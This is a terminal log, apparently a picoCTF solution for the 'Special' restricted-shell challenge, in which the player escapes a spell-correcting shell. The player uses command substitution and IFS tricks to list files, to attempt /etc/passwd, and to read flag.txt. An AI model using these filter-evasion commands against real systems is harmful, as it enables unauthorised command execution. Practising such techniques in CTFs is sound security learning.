Luiscat02-picoctf@webshell:/$ ssh -p 51633 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:51633 ([13.59.203.175]:51633)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:51633' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ ls
Is 
sh: 1: Is: not found
Special$ $(uname)
$(uname) 
sh: 1: Linux: not found
Special$ $(ls)
$(ls) 
sh: 1: blargh: not found
Special$ &(ls -l)                    
Pals all 
sh: 1: Pals: not found
Special$ IFS=];b=catl/etc/passwd:$b
IFS=];b=catl/etc/passwd:$b 
Special$ $(IFS=];b=ls]blargh;$b)
$(IFS=];b=ls]blargh;$b) 
sh: 1: flag.txt: not found
Special$ $/IFS=];b=cat]blargh/flag.txt;$b)
$/IFS=];b=cat]blargh/flag.txt;$b) 
sh: 1: Syntax error: ")" unexpected
Special$ $(IFS=];b=cat]blargh/flag.txt;$b)
$(IFS=];b=cat]blargh/flag.txt;$b) 
sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}: not found
Special$ 

Referencias
https://www.youtube.com/watch?v=aF6UIFJKCic&pp=ygUQRXNwZWNpYWwgcGljb2N0Zg%3D%3D
